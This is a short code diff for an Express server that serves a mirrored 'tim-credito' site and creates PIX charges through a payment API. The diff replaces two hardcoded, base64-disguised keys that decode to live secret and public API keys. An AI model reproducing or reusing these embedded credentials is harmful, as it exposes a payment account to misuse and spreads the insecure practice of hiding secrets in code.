@@ -14,8 +14,8 @@ app.use(express.json());
 // Serve static files from the tim-credito.vercel.app directory
 app.use(express.static(path.join(__dirname, 'tim-credito.vercel.app')));
 
-const BLACKCAT_SECRET_KEY = process.env.BLACKCAT_SECRET_KEY || Buffer.from('c2tfbGl2ZV83NTNiNDcwODU0M2JkMDVkY2QzZWRhNDRlNWIyYzJiM2EyZjYyNTFlOGY1YTJiYjBjZmM4M2U4ODdmNjdjY2E2', 'base64').toString('utf8');
-const BLACKCAT_PUBLIC_KEY = process.env.BLACKCAT_PUBLIC_KEY || Buffer.from('cGtfbGl2ZV8xMjMzOGI0ODFhYjNmODMwMjAyYmI0YzY1YmFlZmVlMjY2YWE5ZjQ2NWExNmM5ZjNlNzA3MTk1NGNlMmNiMTI4', 'base64').toString('utf8');
+const BLACKCAT_SECRET_KEY = process.env.BLACKCAT_SECRET_KEY || Buffer.from('c2tfbGl2ZV80MjdlZGE4ODEyZjdiN2EyMzNiOTQwMDcxMWZlNjg0MGZmNmQ0MTA2ZDRiZmMwZGIyZDc2NGE1Y2YyZTEyYmY2', 'base64').toString('utf8');
+const BLACKCAT_PUBLIC_KEY = process.env.BLACKCAT_PUBLIC_KEY || Buffer.from('cGtfbGl2ZV9hN2QyYWFiMmFjOTM4MzNiOTQyMDVmOWFhNTEyNTE4YjE5MGM1OTYyNDA5MWViM2ZmZGI1ZTc2ODk1OWM5YjBl', 'base64').toString('utf8');
 const BLACKCAT_BASE_URL = process.env.BLACKCAT_BASE_URL || 'https://api.blackcatoficial.com/api';
 
 // Admin credentials
@@ -199,7 +199,7 @@ app.post('/api/pix', async (req, res) => {
             paymentMethod: 'pix',
             items: [
                 {
-                    title: 'Info Produto',
+                    title: 'INFO PRODUTO',
                     unitPrice: amount,
                     quantity: 1,
                     tangible: false
@@ -218,7 +218,7 @@ app.post('/api/pix', async (req, res) => {
                 expiresInDays: 1
             },
             externalRef: externalRef,
-            metadata: 'Info Produto'
+            metadata: 'INFO PRODUTO'
         };
 
         const response = await fetch(`${BLACKCAT_BASE_URL}/sales/create-sale`, {
